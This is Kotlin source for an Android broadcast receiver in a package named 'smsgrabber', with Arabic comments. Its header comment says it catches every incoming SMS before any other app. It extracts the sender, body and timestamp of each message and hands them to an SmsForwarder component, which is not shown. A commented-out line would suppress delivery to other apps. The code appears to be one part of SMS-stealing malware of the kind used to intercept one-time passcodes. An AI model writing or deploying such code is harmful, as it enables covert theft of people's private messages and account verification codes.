package com.smsgrabber

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SmsMessage
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * مستقبل الرسائل النصية - أعلى أولوية
 * يلتقط كل رسالة SMS واردة قبل أي تطبيق آخر
 */
class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED"
        private const val SMS_DELIVER = "android.provider.Telephony.SMS_DELIVER"
        private const val WAP_PUSH_RECEIVED = "android.provider.Telephony.WAP_PUSH_RECEIVED"
        private const val PDU_KEY = "pdus"
    }

    override fun onReceive(context: Context, intent: Intent) {
        // تحقق من نوع البث
        val action = intent.action ?: return

        if (action != SMS_RECEIVED && action != SMS_DELIVER && action != WAP_PUSH_RECEIVED) {
            return
        }

        // استخراج جميع الرسائل
        val messages = getSmsMessages(intent)

        if (messages.isEmpty()) return

        // معالجة كل رسالة
        for (message in messages) {
            val sender = message.originatingAddress ?: message.displayOriginatingAddress ?: "مجهول"
            val body = message.messageBody ?: message.displayMessageBody ?: ""
            val timestamp = message.timestampMillis

            // تجاهل الرسائل الفارغة
            if (body.isBlank()) continue

            // تمرير للمعالج
            SmsForwarder.process(context, sender, body, timestamp)
        }

        // اختياري: منع التطبيقات الأخرى من استقبال الرسالة
        // تلغى تعليق هذا السطر إذا أردت الاحتكار الكامل:
        // abortBroadcast()
    }

    private fun getSmsMessages(intent: Intent): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                // Android 4.4+ - استخدام API الرسمي
                val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                if (smsMessages != null) {
                    messages.addAll(smsMessages)
                }
            } else {
                // Android < 4.4 - استخراج يدوي
                val bundle = intent.extras
                if (bundle != null) {
                    val pdus = bundle.get(PDU_KEY) as? Array<Any>
                    if (pdus != null) {
                        for (pdu in pdus) {
                            val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                            messages.add(sms)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // محاولة استخراج بديلة في حالة الفشل
            try {
                val bundle = intent.extras
                if (bundle != null) {
                    val pdus = bundle.get(PDU_KEY) as? Array<Any>
                    if (pdus != null) {
                        for (pdu in pdus) {
                            val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                            messages.add(sms)
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        // WAP Push - رسائل إعدادات
        if (messages.isEmpty()) {
            try {
                val bundle = intent.extras
                if (bundle != null) {
                    val wapPdus = bundle.get("data") as? ByteArray
                    if (wapPdus != null) {
                        val sms = SmsMessage.createFromPdu(wapPdus)
                        messages.add(sms)
                    }
                }
            } catch (_: Exception) {}
        }

        return messages
    }
}
